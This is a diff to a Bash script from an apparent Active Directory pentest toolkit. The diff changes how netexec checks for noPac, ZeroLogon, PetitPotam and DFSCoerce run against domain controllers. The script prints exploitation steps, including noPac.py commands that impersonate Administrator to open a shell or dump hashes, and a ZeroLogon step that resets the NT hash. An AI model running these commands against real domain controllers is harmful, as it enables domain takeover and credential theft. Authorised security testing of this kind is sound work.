@@ -2055,16 +2055,14 @@ nopac_check() {
     if [ "${kerb_bool}" == true ]; then
         echo -e "${PURPLE}[-] netexec's nopac does not support kerberos authentication${NC}"
     else
-        while IFS= read -r i; do
-            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M nopac --log ${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt" 2>&1
-            if grep -q "VULNERABLE" "${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt"; then
-                echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
-                echo -e "${CYAN}# Get shell:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
-                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
-                echo -e "${CYAN}# Dump hashes:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
-                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
-            fi
-        done <"${target_dc}"
+        run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M nopac --log ${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt" 2>&1
+        if grep -q "VULNERABLE" "${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt"; then
+            echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
+            echo -e "${CYAN}# Get shell:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
+            echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
+            echo -e "${CYAN}# Dump hashes:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
+            echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
+        fi
     fi
     echo -e ""
 }
@@ -2299,9 +2297,7 @@ smbclientng_console() {
 ###### vuln_checks: Vulnerability checks
 zerologon_check() {
     echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
-    while IFS= read -r i; do
-        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M zerologon --log ${output_dir}/Vulnerabilities/ne_zerologon_output_${dc_domain}.txt" 2>&1
-    done <"${target_dc}"
+    run_command "echo -n Y | ${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M zerologon --log ${output_dir}/Vulnerabilities/ne_zerologon_output_${dc_domain}.txt" 2>&1
     if grep -q "VULNERABLE" "${output_dir}/Vulnerabilities/ne_zerologon_output_${dc_domain}.txt"; then
         echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
         echo -e "${CYAN}1. Exploit the vulnerability, set the NT hash to \\x00*8:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
@@ -2329,17 +2325,13 @@ ms17-010_check() {
 
 petitpotam_check() {
     echo -e "${BLUE}[*] PetitPotam check ${NC}"
-    while IFS= read -r i; do
-        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M petitpotam --log ${output_dir}/Vulnerabilities/ne_petitpotam_output_${dc_domain}.txt" 2>&1
-    done <"${target_dc}"
+    run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M petitpotam --log ${output_dir}/Vulnerabilities/ne_petitpotam_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
 dfscoerce_check() {
     echo -e "${BLUE}[*] dfscoerce check ${NC}"
-    while IFS= read -r i; do
-        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M dfscoerce --log ${output_dir}/Vulnerabilities/ne_dfscoerce_output_${dc_domain}.txt" 2>&1
-    done <"${target_dc}"
+    run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M dfscoerce --log ${output_dir}/Vulnerabilities/ne_dfscoerce_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
